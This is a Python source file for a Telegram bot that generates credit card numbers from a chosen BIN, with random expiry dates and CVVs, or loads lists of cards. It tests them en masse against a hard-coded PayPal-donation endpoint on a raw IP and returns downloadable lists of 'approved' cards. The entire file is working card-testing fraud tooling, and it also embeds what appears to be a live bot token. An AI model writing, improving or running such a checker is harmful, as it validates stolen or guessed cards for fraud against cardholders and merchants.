#!/usr/bin/env python3
"""
Advanced Telegram CC Checker / Generator Bot with Result Downloads
"""

import asyncio
import logging
import random
import re
from io import BytesIO
from typing import Dict, List, Optional, Tuple

import aiohttp
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
)

# --- Configuration ---
API_URL = "http://199.244.48.163:8025/paypal_donate"
TIMEOUT = aiohttp.ClientTimeout(total=15)
MAX_CONCURRENT_REQUESTS = 200
DASHBOARD_UPDATE_INTERVAL = 1.5
MAX_STORED_CARDS = 100_000  # safety limit for stored results

# --- Logging ---
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# --- Luhn & Card Utilities ---
def luhn_checksum(card_number: str) -> int:
    digits = [int(d) for d in card_number]
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    total = sum(odd_digits)
    for d in even_digits:
        total += sum(divmod(d * 2, 10))
    return (10 - (total % 10)) % 10

def generate_card(bin_prefix: str) -> str:
    remaining_length = 15 - len(bin_prefix)
    if remaining_length < 0:
        raise ValueError("BIN too long (max 15 digits for a 16-digit card)")
    random_part = ''.join(str(random.randint(0, 9)) for _ in range(remaining_length))
    partial = bin_prefix + random_part
    check_digit = luhn_checksum(partial)
    return partial + str(check_digit)

def generate_expiry_cvv() -> Tuple[str, str]:
    month = f"{random.randint(1, 12):02d}"
    year = random.randint(2027, 2032)
    cvv = f"{random.randint(0, 999):03d}"
    return f"{month}|{year}", cvv

def parse_card_line(line: str) -> Optional[str]:
    line = line.strip()
    if not line:
        return None
    parts = line.split("|")
    if len(parts) != 4:
        return None
    if len(parts[2]) == 2:
        parts[2] = "20" + parts[2]
    elif len(parts[2]) != 4:
        return None
    if not (parts[0].isdigit() and 13 <= len(parts[0]) <= 19):
        return None
    if not (parts[1].isdigit() and 1 <= int(parts[1]) <= 12):
        return None
    if not (parts[2].isdigit() and len(parts[2]) == 4):
        return None
    if not (parts[3].isdigit() and len(parts[3]) == 3):
        return None
    return f"{parts[0]}|{parts[1]}|{parts[2]}|{parts[3]}"

# --- Async HTTP Checker ---
class CheckerSession:
    def __init__(self):
        self.semaphore = asyncio.Semaphore(MAX_CONCURRENT_REQUESTS)
        self.session: Optional[aiohttp.ClientSession] = None

    async def start(self):
        connector = aiohttp.TCPConnector(limit=0, force_close=True)
        self.session = aiohttp.ClientSession(connector=connector, timeout=TIMEOUT)

    async def close(self):
        if self.session:
            await self.session.close()

    async def check_card(self, card_str: str) -> str:
        async with self.semaphore:
            try:
                async with self.session.get(API_URL, params={"cc": card_str}) as resp:
                    if resp.status != 200:
                        return "error"
                    text = await resp.text()
                    if '"status":"DECLINED"' in text:
                        return "declined"
                    else:
                        return "approved"
            except Exception as e:
                logger.debug(f"Request error: {e}")
                return "error"

# --- User Session (per chat) ---
class UserSession:
    def __init__(self, chat_id: int):
        self.chat_id = chat_id
        self.bin: Optional[str] = None
        self.running = False
        self.stop_event = asyncio.Event()
        self.task: Optional[asyncio.Task] = None
        self.dashboard_msg = None
        self.stats = {"total": 0, "declined": 0, "approved": 0, "errors": 0}
        # Storage for result cards
        self.approved_cards: List[str] = []
        self.declined_cards: List[str] = []
        self.error_cards: List[str] = []

    def reset_results(self):
        self.approved_cards.clear()
        self.declined_cards.clear()
        self.error_cards.clear()
        self.stats = {"total": 0, "declined": 0, "approved": 0, "errors": 0}

    async def update_dashboard(self, bin_display: str):
        while self.running:
            try:
                if self.dashboard_msg:
                    msg = (
                        f"📊 **Live Check Dashboard**\n"
                        f"━━━━━━━━━━━━━━━━━━\n"
                        f"Checking CC: {self.stats['total']} done\n"
                        f"Of this BIN: {bin_display}\n"
                        f"Declined: {self.stats['declined']}\n"
                        f"Approved: {self.stats['approved']}\n"
                        f"Errors: {self.stats['errors']}\n"
                        f"━━━━━━━━━━━━━━━━━━\n"
                        f"⚡ Speed: {MAX_CONCURRENT_REQUESTS} threads"
                    )
                    await self.dashboard_msg.edit_text(msg, parse_mode=ParseMode.MARKDOWN)
            except Exception as e:
                logger.error(f"Dashboard update error: {e}")
            await asyncio.sleep(DASHBOARD_UPDATE_INTERVAL)

    def add_result(self, card_str: str, status: str):
        """Append card to the appropriate list if limit not reached."""
        if status == "approved" and len(self.approved_cards) < MAX_STORED_CARDS:
            self.approved_cards.append(card_str)
        elif status == "declined" and len(self.declined_cards) < MAX_STORED_CARDS:
            self.declined_cards.append(card_str)
        elif status == "error" and len(self.error_cards) < MAX_STORED_CARDS:
            self.error_cards.append(card_str)
        self.stats[status] += 1
        self.stats["total"] += 1

# Global store
user_sessions: Dict[int, UserSession] = {}
checker = CheckerSession()

async def get_user_session(chat_id: int) -> UserSession:
    if chat_id not in user_sessions:
        user_sessions[chat_id] = UserSession(chat_id)
    return user_sessions[chat_id]

# --- Telegram Command Handlers ---
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = (
        "🚀 **Advanced CC Checker Bot**\n\n"
        "Commands:\n"
        "/start - Show this help\n"
        "/setbin <BIN> - Set BIN prefix for generation\n"
        "/targetchk - Start generating & checking with the set BIN (continuous)\n"
        "/mchk - Reply to a `.txt` file to mass check custom cards\n"
        "/stop - Stop any running check\n"
        "/approved - Download approved.txt\n"
        "/declined - Download declined.txt\n"
        "/errors - Download errors.txt\n"
        "/results - Show last session's summary\n\n"
        "📌 Example:\n"
        "/setbin 414720\n"
        "/targetchk\n"
        "(wait a while, then /stop to download results)\n\n"
        "⏱ Timeout: 15s | ⚡ Async speed"
    )
    await update.message.reply_text(help_text, parse_mode=ParseMode.MARKDOWN)

async def setbin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: /setbin <BIN>\nExample: /setbin 414720")
        return
    bin_val = context.args[0].strip()
    if not bin_val.isdigit() or len(bin_val) < 4:
        await update.message.reply_text("❌ Invalid BIN. Must be numeric and at least 4 digits.")
        return
    session = await get_user_session(update.effective_chat.id)
    session.bin = bin_val
    await update.message.reply_text(f"✅ BIN set to `{bin_val}`", parse_mode=ParseMode.MARKDOWN)

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    session = await get_user_session(update.effective_chat.id)
    if session.running:
        session.stop_event.set()
        await update.message.reply_text("⏹ Stopping... Use /approved, /declined, /errors to download results.")
    else:
        await update.message.reply_text("No active check to stop.")

async def targetchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    session = await get_user_session(update.effective_chat.id)
    if not session.bin:
        await update.message.reply_text("❌ Please set a BIN first using /setbin")
        return
    if session.running:
        await update.message.reply_text("⚠ Already running. Use /stop first.")
        return

    session.stop_event.clear()
    session.reset_results()
    session.running = True

    msg = await update.message.reply_text("🔄 Starting continuous check...")
    session.dashboard_msg = msg
    task = asyncio.create_task(continuous_check_task(session, session.bin))
    session.task = task

async def continuous_check_task(session: UserSession, bin_prefix: str):
    dashboard_task = asyncio.create_task(session.update_dashboard(bin_prefix))
    try:
        while not session.stop_event.is_set():
            # Generate batch
            cards = []
            for _ in range(100):
                try:
                    cc = generate_card(bin_prefix)
                    exp, cvv = generate_expiry_cvv()
                    card_str = f"{cc}|{exp}|{cvv}"
                    cards.append(card_str)
                except Exception as e:
                    logger.error(f"Generation error: {e}")

            # Check concurrently
            tasks = [checker.check_card(c) for c in cards]
            results = await asyncio.gather(*tasks, return_exceptions=True)

            for card_str, res in zip(cards, results):
                if isinstance(res, Exception):
                    session.add_result(card_str, "error")
                else:
                    session.add_result(card_str, res)  # 'approved' or 'declined'

            await asyncio.sleep(0)
    finally:
        session.running = False
        dashboard_task.cancel()
        try:
            await dashboard_task
        except asyncio.CancelledError:
            pass
        if session.dashboard_msg:
            try:
                final_msg = (
                    f"⏹ **Check Stopped**\n"
                    f"Total: {session.stats['total']}\n"
                    f"Approved: {session.stats['approved']}\n"
                    f"Declined: {session.stats['declined']}\n"
                    f"Errors: {session.stats['errors']}\n"
                    f"Use /approved, /declined, /errors to get the lists."
                )
                await session.dashboard_msg.edit_text(final_msg, parse_mode=ParseMode.MARKDOWN)
            except:
                pass

async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    session = await get_user_session(update.effective_chat.id)
    if session.running:
        await update.message.reply_text("⚠ A check is already running. Stop it first.")
        return

    replied = update.message.reply_to_message
    if not replied or not replied.document:
        await update.message.reply_text("❌ Please reply to a `.txt` file containing cards (format: CC|MM|YY|CVV per line).")
        return

    doc = replied.document
    if not doc.file_name.endswith(".txt"):
        await update.message.reply_text("❌ Only `.txt` files are accepted.")
        return

    await update.message.reply_text("⏳ Downloading file...")
    file = await context.bot.get_file(doc.file_id)
    buf = BytesIO()
    await file.download_to_memory(buf)
    buf.seek(0)
    lines = buf.read().decode("utf-8").splitlines()

    cards = []
    for line in lines:
        formatted = parse_card_line(line)
        if formatted:
            cards.append(formatted)

    if not cards:
        await update.message.reply_text("❌ No valid card entries found.")
        return

    await update.message.reply_text(f"✅ Loaded {len(cards)} cards. Starting mass check...")

    session.stop_event.clear()
    session.reset_results()
    session.running = True

    msg = await update.message.reply_text("🔄 Mass check started...")
    session.dashboard_msg = msg
    task = asyncio.create_task(mass_check_task(session, cards))
    session.task = task

async def mass_check_task(session: UserSession, cards: list):
    bin_display = "N/A"
    dashboard_task = asyncio.create_task(session.update_dashboard(bin_display))
    try:
        chunk_size = 200
        for i in range(0, len(cards), chunk_size):
            if session.stop_event.is_set():
                break
            chunk = cards[i:i+chunk_size]
            tasks = [checker.check_card(c) for c in chunk]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for card_str, res in zip(chunk, results):
                if isinstance(res, Exception):
                    session.add_result(card_str, "error")
                else:
                    session.add_result(card_str, res)
            await asyncio.sleep(0)
    finally:
        session.running = False
        dashboard_task.cancel()
        try:
            await dashboard_task
        except asyncio.CancelledError:
            pass
        if session.dashboard_msg:
            try:
                final_msg = (
                    f"✅ **Mass Check Finished**\n"
                    f"Total: {session.stats['total']}\n"
                    f"Approved: {session.stats['approved']}\n"
                    f"Declined: {session.stats['declined']}\n"
                    f"Errors: {session.stats['errors']}\n"
                    f"Use /approved, /declined, /errors to download."
                )
                await session.dashboard_msg.edit_text(final_msg, parse_mode=ParseMode.MARKDOWN)
            except:
                pass

# --- Result Download Commands ---
async def approved_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    session = await get_user_session(update.effective_chat.id)
    if not session.approved_cards:
        await update.message.reply_text("ℹ No approved cards yet.")
        return
    buf = BytesIO("\n".join(session.approved_cards).encode("utf-8"))
    buf.name = "approved.txt"
    await update.message.reply_document(document=buf, filename="approved.txt")

async def declined_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    session = await get_user_session(update.effective_chat.id)
    if not session.declined_cards:
        await update.message.reply_text("ℹ No declined cards yet.")
        return
    buf = BytesIO("\n".join(session.declined_cards).encode("utf-8"))
    buf.name = "declined.txt"
    await update.message.reply_document(document=buf, filename="declined.txt")

async def errors_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    session = await get_user_session(update.effective_chat.id)
    if not session.error_cards:
        await update.message.reply_text("ℹ No error cards yet.")
        return
    buf = BytesIO("\n".join(session.error_cards).encode("utf-8"))
    buf.name = "errors.txt"
    await update.message.reply_document(document=buf, filename="errors.txt")

async def results_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    session = await get_user_session(update.effective_chat.id)
    msg = (
        "📋 **Last Session Results**\n"
        f"Total Checked: {session.stats['total']}\n"
        f"Approved: {session.stats['approved']}\n"
        f"Declined: {session.stats['declined']}\n"
        f"Errors: {session.stats['errors']}\n\n"
        "Download lists: /approved, /declined, /errors"
    )
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)

# --- Application Setup ---
async def post_init(application: Application):
    await checker.start()

async def post_shutdown(application: Application):
    await checker.close()

def main():
    import os
    TOKEN = os.environ.get("8582836532:AAE7IXU5jrxPS1l-Z1DkLYQMwoDtekv9gsE")
    if not TOKEN:
        raise ValueError("Please set TELEGRAM_BOT_TOKEN environment variable.")

    app = Application.builder().token(TOKEN).post_init(post_init).post_shutdown(post_shutdown).build()

    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("setbin", setbin_command))
    app.add_handler(CommandHandler("targetchk", targetchk_command))
    app.add_handler(CommandHandler("mchk", mchk_command))
    app.add_handler(CommandHandler("stop", stop_command))
    app.add_handler(CommandHandler("approved", approved_command))
    app.add_handler(CommandHandler("declined", declined_command))
    app.add_handler(CommandHandler("errors", errors_command))
    app.add_handler(CommandHandler("results", results_command))

    logger.info("Bot starting...")
    app.run_polling()

if __name__ == "__main__":
    main()
